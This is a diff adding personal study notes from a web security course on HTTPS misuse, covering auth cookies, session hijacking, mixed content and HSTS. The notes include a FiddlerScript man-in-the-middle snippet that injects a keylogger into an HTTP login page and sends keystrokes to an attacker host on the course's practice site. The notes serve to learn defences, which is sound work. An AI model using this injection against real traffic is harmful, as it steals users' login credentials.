@@ -2,6 +2,11 @@
 Introduction
 ----------------------------
 
+Websites for course:
+
+	- http://attacker.hackyourselffirst.troyhunt.com/
+	- http://hackyourselffirst.troyhunt.com/
+
 Chrome developper tool vs fiddler:
 	- Fiddler behave like a HTTP proxy (sits between browser and the website)
 
@@ -22,3 +27,51 @@ Transport Layer Protection (HTTPS, SSL, etc.)
 Man in the middle
 	- Observe/modify a communication
 
+Persisting authentification state via cookies
+	- HTTP is state less
+	- Auth cookie (Authentication cookie)
+		- Is in the response of the authentication from the server
+		- All subsequent requests (any requests) from the client includes the auth cookie so that the server always know who the requestor is.
+
+Auth cookie via unsecure connection
+	- If an attacker can intercept the auth cookie on unsecure request, it can reproduce any requests and receive a valid response (and therefor to be logged in)
+	- It only takes one request so that the auth cookie is vulnarable and the attacker could highjack the session
+
+Loading login forms over HTTP
+	A login:
+		- <insecure>(Request login in HTTP -> Login response in HTTP) -> <secure>(After that credentials are posted in HTTPS -> Response in HTTPS)
+	- So, we atteck the form itself instead of the POST request (which is encrypted)
+
+	In the OnBeforeResponse method in the FiddlerScript tab:
+
+        if(oSession.HostnameIs("http://hackyourselffirst.troyhunt.com") && oSession.PathAndQuery == "/Account/Login") {
+            // Remove any compression or chunking
+            oSession.utilDecodeResponse();
+            
+            var oBody = System.Text.Encoding.UTF8.GetString(oSession.requestBodyBytes);
+
+            // Inject the keylogger into the page
+            oBody = oBody.Replace("</body>", "<script type=\"text/javascript\" src=\"http://attacker.hackyourselffirst.troyhunt.com/Scripts/keylogger.js\"></script><script type=\"text/javascript\">destination='http://attacker.hackyourselffirst.troyhunt.com/Keylogger/?k=';</script></body>");
+
+            oSession.utilSetResponseBody(oBody);
+        }
+
+    	- An attacker can do that at any time on an unsecure connection
+    	- Over HTTPS, an attacker can't modify the loggin page
+
+Exploiting mixed-mode content: Loading a secure page
+	All assets must be loaded securely to have the site secure
+	For example: An HTTP ajax call in an HTTPS website.
+		- To apply the correct scheme, : <script src="//ajax.googleapis/com[..]">
+			- Automatically switch to secure/unsecure depending of the context
+
+HSTS header (HTTP Strict Transport Security)(This a mititgation to have only HTTPS request)
+	- It forces request from the browser to only be made over secure connection under specified circusmtences
+	- For example: http://hackyourselffirst.troyhunt.com/Content/site.css contains the AuthCookie ...
+		Response can contain Strict-Transport-Security: max-age=1440 (in minutes). This means that chrome cannot emit HTTP request to this site for the next day. If we do, it will be converted into a HTTPS request.
+
+Summary
+	- SSL is more than just encryption (the 3 objectives above)
+	- Many points to do a man in the middle
+	- If you need SSL, you also need to use it correctly (no sensitive cookies over HTTP, don't use HTTP to load the forms, do not embed insecure content in secure page (mixed content))
+	- HSTS additional safety net
